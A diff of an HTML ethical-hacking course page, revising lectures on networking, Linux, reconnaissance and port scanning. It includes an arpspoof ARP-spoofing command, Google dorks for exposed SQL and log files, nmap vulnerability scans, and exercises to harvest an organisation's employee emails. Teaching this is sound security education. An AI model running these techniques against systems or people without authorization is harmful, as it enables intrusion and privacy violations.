+        <pre><span class="cm"># View ARP cache</span>
+arp -a
+
+<span class="cm"># ARP scan the local network</span>
+sudo arp-scan --localnet
+
+<span class="cm"># ARP spoofing with arpspoof (dsniff package)</span>
+sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</pre>
+    </div>
+
+    <div class="box tip">
+        <div class="box-title">✅ Pro Tip</div>
+        Always start reconnaissance with passive techniques before active scanning to avoid detection.
+        Active scanning (like Nmap) generates traffic logs — passive recon (Shodan, WHOIS, Google Dorks)
+        leaves no trace on the target's systems.
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 2.1 — Network Exploration</div>
+        <p>1. Find your IP address and default gateway.<br>
+            2. Ping google.com and note the TTL value — what OS does it suggest?<br>
+            3. Use <code>nslookup</code> to find the IP of a website.<br>
+            4. Run <code>traceroute google.com</code> (or <code>tracert</code> on Windows) and count the hops.</p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 2.2 — DNS Enumeration</div>
+        <p>Using <code>dig</code>, enumerate the DNS records of a domain you own or a practice domain.
+            Try to retrieve A, MX, NS, and TXT records. Attempt a zone transfer and document whether
+            it succeeds or fails — and why.</p>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Exercise 2.2</span>
+        </div>
+        <pre>dig example.com A
+dig example.com MX
+dig example.com NS
+dig example.com TXT
+dig axfr @ns1.example.com example.com</pre>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 2.3 — Banner Grabbing</div>
+        <p>Use <code>netcat</code> to connect to port 80 of a web server and manually send an HTTP
+            request. Observe what information the server reveals in its response headers (server type,
+            version, OS). This is called <strong>banner grabbing</strong> — a key recon technique.</p>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">terminal — Exercise 2.3</span>
+        </div>
+        <pre><span class="cm"># Connect to web server</span>
+nc -v example.com 80
+
+<span class="cm"># Then type the following and press Enter twice:</span>
+HEAD / HTTP/1.0
+
+<span class="cm"># Look for: Server:, X-Powered-By:, Set-Cookie: fields</span></pre>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 2.4 — TCP vs UDP Report</div>
+        <p>Write a short report (in a text file) explaining the difference between TCP and UDP with
+            real-world examples relevant to hacking. Include: how Nmap handles each differently,
+            which attacks target TCP vs UDP, and why UDP scanning is slower and less reliable.</p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(0)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(2)">Next Lecture →</button>
+    </div>
+</div>
                 <!-- ===================== LECTURE 03 ===================== -->
-                <div class="lecture" id="lec-2">
-                    <div class="lecture-tag">Lecture 03 · Fundamentals</div>
-                    <h1>Linux & Command Line Mastery for Hackers</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-beginner">Beginner</span>
-                        <span class="meta-badge">~65 min</span>
-                        <span class="meta-badge">Requires: Lecture 02</span>
-                    </div>
+          <div class="lecture" id="lec-2">
+    <div class="lecture-tag">Lecture 03 · Fundamentals</div>
+    <h1>Linux & Command Line Mastery for Hackers</h1>
 
-                    <h2>Why Linux is Essential for Ethical Hacking</h2>
-                    <p>Most servers, networking devices, and penetration testing tools run on Linux. Kali Linux is the
-                        de-facto standard distribution for ethical hackers.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-beginner">Beginner</span>
+        <span class="meta-badge">~65 min</span>
+        <span class="meta-badge">Requires: Lecture 02</span>
+    </div>
 
-                    <h2>1. Linux File System Hierarchy</h2>
-                    <ul>
-                        <li><strong>/</strong> — Root directory</li>
-                        <li><strong>/home</strong> — User files</li>
-                        <li><strong>/etc</strong> — Configuration files</li>
-                        <li><strong>/var</strong> — Logs and variable data</li>
-                        <li><strong>/tmp</strong> — Temporary files</li>
-                        <li><strong>/bin & /usr/bin</strong> — Executable commands</li>
-                    </ul>
+    <h2>Why Linux is Essential for Ethical Hacking</h2>
+    <p>
+        Linux dominates servers, cloud infrastructure, IoT devices, and cybersecurity tooling.
+        Ethical hackers rely on Linux because it provides:
+    </p>
+    <ul>
+        <li>Full control over the system (open-source kernel)</li>
+        <li>Powerful command-line tools for automation</li>
+        <li>Built-in networking and scripting capabilities</li>
+        <li>Security-focused distributions like <strong>Kali Linux</strong> and <strong>Parrot OS</strong></li>
+    </ul>
 
-                    <h2>2. Essential Commands Every Hacker Must Know</h2>
+    <div class="box">
+        <div class="box-title">⚠️ Hacker Insight</div>
+        Most real-world attacks and defenses happen on Linux systems. Mastering the terminal is non-negotiable.
+    </div>
 
-                    <h3>Navigation & File Management</h3>
-                    <div class="code-block">
-                        <pre>pwd                    <span class="cm"># Print Working Directory</span>
-ls -la                 <span class="cm"># List files (detailed)</span>
-cd /etc                <span class="cm"># Change directory</span>
-mkdir tools            <span class="cm"># Create directory</span>
-touch test.txt         <span class="cm"># Create empty file</span>
-cp file1 file2         <span class="cm"># Copy</span>
-mv old new             <span class="cm"># Move / Rename</span>
-rm -rf folder          <span class="cm"># Remove (careful!)</span></pre>
-                    </div>
+    <h2>1. Linux File System Hierarchy</h2>
+    <ul>
+        <li><strong>/</strong> — Root directory (everything starts here)</li>
+        <li><strong>/home</strong> — User files</li>
+        <li><strong>/root</strong> — Root user home</li>
+        <li><strong>/etc</strong> — Configuration files</li>
+        <li><strong>/var</strong> — Logs and variable data</li>
+        <li><strong>/tmp</strong> — Temporary files</li>
+        <li><strong>/bin & /usr/bin</strong> — Executable commands</li>
+        <li><strong>/sbin</strong> — System binaries (admin commands)</li>
+        <li><strong>/dev</strong> — Device files</li>
+        <li><strong>/proc</strong> — Process and kernel info</li>
+    </ul>
 
-                    <h3>System Information & Processes</h3>
-                    <div class="code-block">
-                        <pre>uname -a               <span class="cm"># System info</span>
-whoami                 <span class="cm"># Current user</span>
-ps aux                 <span class="cm"># Running processes</span>
-top                    <span class="cm"># Live process monitor</span>
-kill PID               <span class="cm"># Kill process</span>
-df -h                  <span class="cm"># Disk usage</span></pre>
-                    </div>
+    <h2>2. Essential Commands Every Hacker Must Know</h2>
 
-                    <h3>Networking Commands</h3>
-                    <div class="code-block">
-                        <pre>ifconfig / ip addr     <span class="cm"># Network interfaces</span>
-ping 8.8.8.8           <span class="cm"># Test connectivity</span>
-netstat -tuln          <span class="cm"># Listening ports</span>
-ss -tuln               <span class="cm"># Modern alternative</span>
-traceroute google.com</pre>
-                    </div>
+    <h3>Navigation & File Management</h3>
+    <div class="code-block">
+<pre>pwd                    # Print Working Directory
+ls -la                 # List files (detailed + hidden)
+cd /etc                # Change directory
+mkdir tools            # Create directory
+touch test.txt         # Create empty file
+cp file1 file2         # Copy
+mv old new             # Move / Rename
+rm -rf folder          # Remove (DANGEROUS)
+find / -name "test"    # Find files</pre>
+    </div>
 
-                    <h2>3. Text Processing Tools (Hacker’s Best Friends)</h2>
-                    <ul>
-                        <li><strong>cat</strong> — View file content</li>
-                        <li><strong>grep</strong> — Search text</li>
-                        <li><strong>sed</strong> — Stream editor</li>
-                        <li><strong>awk</strong> — Pattern scanning</li>
-                        <li><strong>cut / sort / uniq</strong> — Data manipulation</li>
-                    </ul>
+    <h3>System Information & Processes</h3>
+    <div class="code-block">
+<pre>uname -a               # System info
+whoami                 # Current user
+id                     # User + group info
+ps aux                 # Running processes
+top / htop             # Live process monitor
+kill PID               # Kill process
+df -h                  # Disk usage
+free -m                # Memory usage
+uptime                 # System uptime</pre>
+    </div>
 
-                    <div class="code-block">
-                        <pre>cat /etc/passwd | grep bash
+    <h3>Networking Commands</h3>
+    <div class="code-block">
+<pre>ifconfig / ip addr     # Network interfaces
+ping 8.8.8.8           # Test connectivity
+netstat -tuln          # Open ports
+ss -tuln               # Faster alternative
+traceroute google.com  # Route tracking
+curl example.com       # HTTP requests
+wget url               # Download files</pre>
+    </div>
+
+    <h2>3. File Permissions & Ownership (CRITICAL)</h2>
+    <p>Understanding permissions is key for both attacking and securing systems.</p>
+
+    <div class="code-block">
+<pre>ls -l
+chmod 755 file.sh
+chmod +x script.sh
+chown user:group file
+</pre>
+    </div>
+
+    <ul>
+        <li><strong>r (read)</strong> = 4</li>
+        <li><strong>w (write)</strong> = 2</li>
+        <li><strong>x (execute)</strong> = 1</li>
+    </ul>
+
+    <p><strong>Example:</strong> 755 = owner (rwx), group (rx), others (rx)</p>
+
+    <div class="box tip">
+        <div class="box-title">💡 Hacker Tip</div>
+        Misconfigured permissions are one of the easiest privilege escalation vectors.
+    </div>
+
+    <h2>4. Text Processing Tools (Hacker’s Best Friends)</h2>
+    <ul>
+        <li><strong>cat</strong> — View file</li>
+        <li><strong>grep</strong> — Search patterns</li>
+        <li><strong>sed</strong> — Modify streams</li>
+        <li><strong>awk</strong> — Advanced processing</li>
+        <li><strong>cut / sort / uniq</strong> — Data filtering</li>
+    </ul>
+
+    <div class="code-block">
+<pre>cat /etc/passwd | grep bash
 ps aux | grep apache
-netstat -tuln | grep 80</pre>
-                    </div>
+netstat -tuln | grep 80
+cut -d: -f1 /etc/passwd
+sort users.txt | uniq</pre>
+    </div>
 
-                    <h2>4. Kali Linux Specific Tools</h2>
-                    <ul>
-                        <li><strong>nmap</strong> — Network scanner</li>
-                        <li><strong>metasploit</strong> — Exploitation framework</li>
-                        <li><strong>burpsuite</strong> — Web proxy</li>
-                        <li><strong>wireshark</strong> — Packet analyzer</li>
-                        <li><strong>john / hashcat</strong> — Password crackers</li>
-                    </ul>
+    <h2>5. Redirection & Pipes (Power Feature)</h2>
+    <div class="code-block">
+<pre>command > file.txt      # Overwrite output
+command >> file.txt     # Append output
+command 2> error.log    # Errors only
+command1 | command2     # Pipe output</pre>
+    </div>
 
-                    <div class="box tip">
-                        <div class="box-title">✅ Pro Tip</div>
-                        Learn to chain commands with pipes (<code>|</code>) and redirects (<code>&gt;</code>,
-                        <code>&gt;&gt;</code>). This is where real power lies.
-                    </div>
+    <p>
+        Chaining commands allows automation and complex data extraction—essential for reconnaissance.
+    </p>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 3.1 — Linux Exploration</div>
-                        <p>1. Find all files containing "password" in /etc<br>
-                            2. List all listening ports<br>
-                            3. Create a directory <code>recon</code> and a file <code>targets.txt</code><br>
-                            4. Use <code>history</code> to see your previous commands</p>
-                    </div>
+    <h2>6. Package Management</h2>
+    <div class="code-block">
+<pre>sudo apt update
+sudo apt upgrade
+sudo apt install nmap
+sudo apt remove package</pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 3.2</div>
-                        <p>Write a small bash script (<code>system_info.sh</code>) that displays: current user, IP
-                            address, OS version, and running services.</p>
-                    </div>
+    <h2>7. Kali Linux Specific Tools</h2>
+    <ul>
+        <li><strong>nmap</strong> — Network scanning</li>
+        <li><strong>metasploit</strong> — Exploitation</li>
+        <li><strong>burpsuite</strong> — Web testing</li>
+        <li><strong>wireshark</strong> — Packet analysis</li>
+        <li><strong>john / hashcat</strong> — Password cracking</li>
+        <li><strong>aircrack-ng</strong> — WiFi hacking</li>
+    </ul>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(1)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(3)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h2>8. Basic Bash Scripting</h2>
+    <div class="code-block">
+<pre>#!/bin/bash
+echo "User: $(whoami)"
+echo "IP: $(hostname -I)"
+echo "System: $(uname -a)"</pre>
+    </div>
+
+    <p>Make executable:</p>
+    <div class="code-block">
+<pre>chmod +x script.sh
+./script.sh</pre>
+    </div>
+
+    <div class="box">
+        <div class="box-title">🚀 Why Scripting Matters</div>
+        Hackers automate repetitive tasks like scanning, enumeration, and reporting using scripts.
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 3.1 — Linux Exploration</div>
+        <p>
+            1. Find all files containing "password" in /etc<br>
+            2. List all listening ports<br>
+            3. Create a directory <code>recon</code> and a file <code>targets.txt</code><br>
+            4. Use <code>history</code> to see previous commands
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 3.2 — Bash Script</div>
+        <p>
+            Create <code>system_info.sh</code> that shows:<br>
+            • Current user<br>
+            • IP address<br>
+            • OS version<br>
+            • Running services
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge Exercise</div>
+        <p>
+            Write a one-liner command to:
+            list all users, filter only those with bash shell,
+            and save output to a file.
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(1)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(3)">Next Lecture →</button>
+    </div>
+</div>
                 <!-- ===================== LECTURE 04 ===================== -->
-                <div class="lecture" id="lec-3">
-                    <div class="lecture-tag">Lecture 04 · Fundamentals</div>
-                    <h1>Reconnaissance & Footprinting</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-intermediate">Intermediate</span>
-                        <span class="meta-badge">~70 min</span>
-                        <span class="meta-badge">Requires: Lecture 03</span>
-                    </div>
+          <div class="lecture" id="lec-3">
+    <div class="lecture-tag">Lecture 04 · Fundamentals</div>
+    <h1>Reconnaissance & Footprinting</h1>
 
-                    <h2>What is Reconnaissance?</h2>
-                    <p>Reconnaissance (Recon) is the first and most important phase of ethical hacking. It involves
-                        gathering as much information as possible about the target without being detected. Good recon
-                        can make or break an entire penetration test.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-intermediate">Intermediate</span>
+        <span class="meta-badge">~70 min</span>
+        <span class="meta-badge">Requires: Lecture 03</span>
+    </div>
 
-                    <h2>Types of Reconnaissance</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Type</th>
-                                    <th>Description</th>
-                                    <th>Examples</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>Passive Recon</strong></td>
-                                    <td>No direct interaction with target</td>
-                                    <td>Google, WHOIS, Shodan, Social Media</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Active Recon</strong></td>
-                                    <td>Direct interaction with target</td>
-                                    <td>Port scanning, Ping sweeps</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h2>What is Reconnaissance?</h2>
+    <p>
+        Reconnaissance (Recon) is the first and most critical phase of ethical hacking.
+        It involves gathering intelligence about a target system, network, or organization.
+        The goal is to build a complete attack surface map before any exploitation begins.
+    </p>
 
-                    <h2>1. Passive Reconnaissance Techniques</h2>
+    <div class="box">
+        <div class="box-title">🧠 Key Principle</div>
+        The more you know about the target, the fewer guesses you need to make later.
+    </div>
 
-                    <h3>WHOIS Lookup</h3>
-                    <div class="code-block">
-                        <pre>whois example.com
+    <h2>Types of Reconnaissance</h2>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Description</th>
+                    <th>Risk Level</th>
+                    <th>Examples</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Passive Recon</strong></td>
+                    <td>No direct interaction with target</td>
+                    <td>Low (stealthy)</td>
+                    <td>Google, WHOIS, Shodan, Social Media</td>
+                </tr>
+                <tr>
+                    <td><strong>Active Recon</strong></td>
+                    <td>Direct interaction with target</td>
+                    <td>High (detectable)</td>
+                    <td>Port scanning, Ping sweeps</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2>Recon Workflow (Real-World)</h2>
+    <ol>
+        <li>Identify target scope (domains, IPs)</li>
+        <li>Gather passive intelligence (OSINT)</li>
+        <li>Enumerate subdomains</li>
+        <li>Discover live hosts</li>
+        <li>Scan ports and services</li>
+        <li>Identify technologies and vulnerabilities</li>
+    </ol>
+
+    <h2>1. Passive Reconnaissance Techniques</h2>
+
+    <h3>WHOIS Lookup</h3>
+    <div class="code-block">
+<pre>whois example.com
 whois -h whois.iana.org example.com</pre>
-                    </div>
+    </div>
+    <p>Reveals domain owner, registrar, DNS servers, and registration dates.</p>
 
-                    <h3>Google Dorks (Advanced Search)</h3>
-                    <div class="code-block">
-                        <pre>site:example.com filetype:pdf
+    <h3>Google Dorks (Advanced Search)</h3>
+    <div class="code-block">
+<pre>site:example.com filetype:pdf
 inurl:admin site:example.com
-intitle:"index of" "parent directory"</pre>
-                    </div>
+intitle:"index of" "parent directory"
+site:example.com ext:sql | ext:log</pre>
+    </div>
 
-                    <h3>Shodan & Censys</h3>
-                    <p>Search engines for internet-connected devices.</p>
+    <h3>Shodan & Censys</h3>
+    <p>Search engines that index internet-connected devices, open ports, and exposed services.</p>
 
-                    <h2>2. Active Reconnaissance</h2>
+    <h3>theHarvester (Email & Domain Info)</h3>
+    <div class="code-block">
+<pre>theHarvester -d example.com -b google
+theHarvester -d example.com -b linkedin</pre>
+    </div>
 
-                    <h3>Host Discovery</h3>
-                    <div class="code-block">
-                        <pre>ping -c 4 target.com
-nmap -sn 192.168.1.0/24          <span class="cm"># Ping sweep</span></pre>
-                    </div>
+    <h2>2. Subdomain Enumeration (CRITICAL)</h2>
+    <p>Subdomains often expose hidden services and entry points.</p>
 
-                    <h3>Port Scanning with Nmap</h3>
-                    <div class="code-block">
-                        <pre>nmap -sV -O target.com                    <span class="cm"># Service version + OS detection</span>
-nmap -sS -p- target.com                 <span class="cm"># SYN scan all ports</span>
-nmap -sC -sV -A target.com              <span class="cm"># Aggressive scan</span></pre>
-                    </div>
+    <div class="code-block">
+<pre>sublist3r -d example.com
+amass enum -d example.com
+assetfinder example.com</pre>
+    </div>
 
-                    <h2>3. DNS Reconnaissance</h2>
-                    <div class="code-block">
-                        <pre>dig example.com ANY
+    <p>Validate live subdomains:</p>
+    <div class="code-block">
+<pre>cat subs.txt | httpx
+</pre>
+    </div>
+
+    <h2>3. Active Reconnaissance</h2>
+
+    <h3>Host Discovery</h3>
+    <div class="code-block">
+<pre>ping -c 4 target.com
+nmap -sn 192.168.1.0/24        # Ping sweep</pre>
+    </div>
+
+    <h3>Port Scanning with Nmap</h3>
+    <div class="code-block">
+<pre>nmap -sV -O target.com            # Service + OS detection
+nmap -sS -p- target.com           # Full port scan
+nmap -sC -sV -A target.com        # Aggressive scan
+nmap -oX scan.xml target.com      # Save XML output</pre>
+    </div>
+
+    <h3>Service Enumeration</h3>
+    <div class="code-block">
+<pre>nmap -sV --script=banner target.com
+nmap --script vuln target.com</pre>
+    </div>
+
+    <h2>4. DNS Reconnaissance</h2>
+    <div class="code-block">
+<pre>dig example.com ANY
+dig mx example.com
 dnsenum example.com
 dnsrecon -d example.com -t std</pre>
-                    </div>
+    </div>
 
-                    <h2>4. OSINT Framework</h2>
-                    <ul>
-                        <li>People search: Pipl, Spokeo, LinkedIn</li>
-                        <li>Company info: Hunter.io, theHarvester</li>
-                        <li>Email harvesting: theHarvester</li>
-                    </ul>
+    <p>Look for:</p>
+    <ul>
+        <li>Mail servers (MX records)</li>
+        <li>Subdomains</li>
+        <li>Zone transfer misconfigurations</li>
+    </ul>
 
-                    <div class="box warning">
-                        <div class="box-title">⚠️ Important Note</div>
-                        Always get explicit written permission before performing active reconnaissance on any target.
-                    </div>
+    <h2>5. Web Application Recon</h2>
+    <div class="code-block">
+<pre>whatweb example.com
+wappalyzer
+nikto -h example.com
+gobuster dir -u http://example.com -w wordlist.txt</pre>
+    </div>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 4.1 — Passive Recon</div>
-                        <p>Choose a public organization (e.g., a university or company) and gather:
-                            <br>• Domain registration info (WHOIS)
-                            <br>• Subdomains
-                            <br>• Public IP ranges
-                            <br>• Employee names and emails
-                        </p>
-                    </div>
+    <p>Identify:</p>
+    <ul>
+        <li>Technologies (PHP, Apache, WordPress)</li>
+        <li>Hidden directories</li>
+        <li>Outdated software</li>
+    </ul>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 4.2 — Active Recon</div>
-                        <p>Using your local lab environment or authorized test target:
-                            <br>1. Perform host discovery
-                            <br>2. Run a full port scan with service version detection
-                            <br>3. Save the output in XML format for later analysis
-                        </p>
-                    </div>
+    <h2>6. OSINT Framework</h2>
+    <ul>
+        <li>People search: LinkedIn, Pipl</li>
+        <li>Email discovery: Hunter.io</li>
+        <li>Leaks & breaches: HaveIBeenPwned</li>
+        <li>Metadata extraction: exiftool</li>
+    </ul>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(2)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(4)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h2>7. Automation & Recon Pipelines</h2>
+    <div class="code-block">
+<pre>sublist3r -d example.com > subs.txt
+cat subs.txt | httpx > live.txt
+nmap -iL live.txt -sV -oA results</pre>
+    </div>
+
+    <div class="box tip">
+        <div class="box-title">🚀 Pro Tip</div>
+        Automation is what separates beginners from professionals. Build recon pipelines.
+    </div>
+
+    <h2>8. Documentation & Reporting</h2>
+    <p>Always document findings:</p>
+    <ul>
+        <li>Discovered domains and IPs</li>
+        <li>Open ports and services</li>
+        <li>Potential vulnerabilities</li>
+        <li>Screenshots and logs</li>
+    </ul>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Legal Warning</div>
+        Never perform active reconnaissance without explicit written authorization.
+        Unauthorized scanning can be illegal.
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 4.1 — Passive Recon</div>
+        <p>
+            Choose a public organization and gather:
+            <br>• WHOIS info
+            <br>• Subdomains
+            <br>• Public IP ranges
+            <br>• Employee emails
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 4.2 — Active Recon</div>
+        <p>
+            Using a lab or authorized target:
+            <br>1. Perform host discovery
+            <br>2. Run full port scan
+            <br>3. Save results in XML
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge Exercise</div>
+        <p>
+            Build a full recon pipeline that:
+            <br>• Finds subdomains
+            <br>• Filters live hosts
+            <br>• Scans services
+            <br>• Outputs structured results
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(2)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(4)">Next Lecture →</button>
+    </div>
+</div>
 
                 <!-- ===================== LECTURE 05 ===================== -->
-                <div class="lecture" id="lec-4">
-                    <div class="lecture-tag">Lecture 05 · Fundamentals</div>
-                    <h1>Scanning & Enumeration</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-intermediate">Intermediate</span>
-                        <span class="meta-badge">~75 min</span>
-                        <span class="meta-badge">Requires: Lecture 04</span>
-                    </div>
+       
+<div class="lecture" id="lec-4">
+    <div class="lecture-tag">Lecture 05 · Fundamentals</div>
+    <h1>Scanning & Enumeration</h1>
 
-                    <h2>Introduction to Scanning</h2>
-                    <p>Scanning is the process of actively probing a target to discover live hosts, open ports, running
-                        services, and operating systems. It bridges reconnaissance and exploitation.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-intermediate">Intermediate</span>
+        <span class="meta-badge">~75 min</span>
+        <span class="meta-badge">Requires: Lecture 04</span>
+    </div>
 
-                    <h2>1. Host Discovery (Finding Live Targets)</h2>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">terminal</span>
-                        </div>
-                        <pre>nmap -sn 192.168.1.0/24              <span class="cm"># Ping sweep</span>
-nmap -PE -PP -PM target.com         <span class="cm"># ICMP echo/timestamp/mask</span>
+    <h2>Introduction to Scanning</h2>
+    <p>
+        Scanning is the phase where an attacker or ethical hacker actively interacts with a target
+        to identify live systems, open ports, running services, and possible entry points.
+    </p>
+
+    <p>
+        It comes after reconnaissance and before exploitation. At this stage, you are no longer
+        guessing — you are verifying.
+    </p>
+
+    <div class="box">
+        <div class="box-title">🧠 Key Idea</div>
+        Recon tells you <em>where to look</em>. Scanning tells you <em>what is actually there</em>.
+    </div>
+
+    <h2>1. Host Discovery (Finding Live Targets)</h2>
+    <p>
+        Before scanning ports, you need to know which machines are alive.
+        This avoids wasting time scanning offline systems.
+    </p>
+
+    <div class="code-block">
+<pre>nmap -sn 192.168.1.0/24              # Ping sweep (no port scan)
+nmap -PE -PP -PM target.com          # Different ICMP probes
 masscan -p80,443 192.168.1.0/24 --rate=1000</pre>
-                    </div>
+    </div>
 
-                    <h2>2. Port Scanning Techniques</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Scan Type</th>
-                                    <th>Command</th>
-                                    <th>Stealth Level</th>
-                                    <th>Use Case</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>TCP SYN Scan</td>
-                                    <td><code>nmap -sS</code></td>
-                                    <td>High</td>
-                                    <td>Default & fastest</td>
-                                </tr>
-                                <tr>
-                                    <td>TCP Connect Scan</td>
-                                    <td><code>nmap -sT</code></td>
-                                    <td>Low</td>
-                                    <td>When no raw socket privileges</td>
-                                </tr>
-                                <tr>
-                                    <td>UDP Scan</td>
-                                    <td><code>nmap -sU</code></td>
-                                    <td>Medium</td>
-                                    <td>DNS, SNMP, DHCP</td>
-                                </tr>
-                                <tr>
-                                    <td>Version Detection</td>
-                                    <td><code>nmap -sV</code></td>
-                                    <td>Medium</td>
-                                    <td>Service & version info</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h3>Explanation</h3>
+    <ul>
+        <li><strong>-sn</strong> → Host discovery only (no ports scanned)</li>
+        <li><strong>-PE</strong> → ICMP echo (like ping)</li>
+        <li><strong>-PP</strong> → Timestamp request</li>
+        <li><strong>-PM</strong> → Netmask request</li>
+    </ul>
 
-                    <h2>3. Advanced Nmap Usage</h2>
-                    <div class="code-block">
-                        <pre>nmap -sS -sV -O -T4 target.com          <span class="cm"># Aggressive scan</span>
-nmap -A target.com                     <span class="cm"># Full aggressive scan</span>
-nmap -sC --script vuln target.com      <span class="cm"># Vulnerability scripts</span>
-nmap -iL targets.txt -oX output.xml    <span class="cm"># Input list, XML output</span></pre>
-                    </div>
+    <div class="box tip">
+        <div class="box-title">💡 Real-World Tip</div>
+        Many systems block ping. A host may still be alive even if it doesn't respond to ICMP.
+    </div>
 
-                    <h2>4. Enumeration (Service & User Enumeration)</h2>
+    <h3>Example Output</h3>
+    <div class="code-block">
+<pre>Nmap scan report for 192.168.1.10
+Host is up (0.0030s latency)</pre>
+    </div>
 
-                    <h3>Common Enumeration Techniques</h3>
-                    <ul>
-                        <li><strong>SMB Enumeration</strong>: <code>enum4linux</code>, <code>smbclient</code></li>
-                        <li><strong>SNMP Enumeration</strong>: <code>snmpwalk</code></li>
-                        <li><strong>HTTP Enumeration</strong>: <code>nikto</code>, <code>dirb</code>,
-                            <code>gobuster</code>
-                        </li>
-                        <li><strong>LDAP Enumeration</strong>: <code>ldapsearch</code></li>
-                    </ul>
+    <p>This confirms the machine is reachable and worth scanning further.</p>
 
-                    <div class="code-block">
-                        <pre>gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-enum4linux -a target.com
+    <h2>2. Port Scanning Techniques</h2>
+
+    <p>
+        Ports are entry points into a system. Each open port usually corresponds to a service.
+    </p>
+
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Scan Type</th>
+                    <th>Command</th>
+                    <th>Stealth</th>
+                    <th>Explanation</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>TCP SYN Scan</td>
+                    <td><code>nmap -sS</code></td>
+                    <td>High</td>
+                    <td>Half-open scan (doesn't complete handshake)</td>
+                </tr>
+                <tr>
+                    <td>TCP Connect</td>
+                    <td><code>nmap -sT</code></td>
+                    <td>Low</td>
+                    <td>Full connection (easier to detect)</td>
+                </tr>
+                <tr>
+                    <td>UDP Scan</td>
+                    <td><code>nmap -sU</code></td>
+                    <td>Medium</td>
+                    <td>Finds services like DNS, SNMP</td>
+                </tr>
+                <tr>
+                    <td>Version Detection</td>
+                    <td><code>nmap -sV</code></td>
+                    <td>Medium</td>
+                    <td>Identifies service versions</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h3>Example</h3>
+    <div class="code-block">
+<pre>nmap -sS -p 22,80,443 target.com</pre>
+    </div>
+
+    <h3>Sample Output Explained</h3>
+    <div class="code-block">
+<pre>PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</pre>
+    </div>
+
+    <ul>
+        <li><strong>open</strong> → Service is accessible</li>
+        <li><strong>closed</strong> → No service</li>
+        <li><strong>filtered</strong> → Firewall blocking</li>
+    </ul>
+
+    <h2>3. Advanced Nmap Usage</h2>
+
+    <p>Combine multiple flags for deeper insights:</p>
+
+    <div class="code-block">
+<pre>nmap -sS -sV -O -T4 target.com
+nmap -A target.com
+nmap -sC --script vuln target.com
+nmap -p- target.com                  # Scan ALL ports (1–65535)</pre>
+    </div>
+
+    <h3>Flag Breakdown</h3>
+    <ul>
+        <li><strong>-O</strong> → OS detection</li>
+        <li><strong>-T4</strong> → Faster scan</li>
+        <li><strong>-sC</strong> → Default scripts</li>
+        <li><strong>--script vuln</strong> → Vulnerability detection</li>
+    </ul>
+
+    <h3>Example Insight</h3>
+    <p>
+        If Nmap shows:
+    </p>
+
+    <div class="code-block">
+<pre>80/tcp open http Apache httpd 2.4.49</pre>
+    </div>
+
+    <p>
+        You now know:
+        <br>• Web server is Apache
+        <br>• Version is 2.4.49
+        <br>→ You can search for known vulnerabilities for that version
+    </p>
+
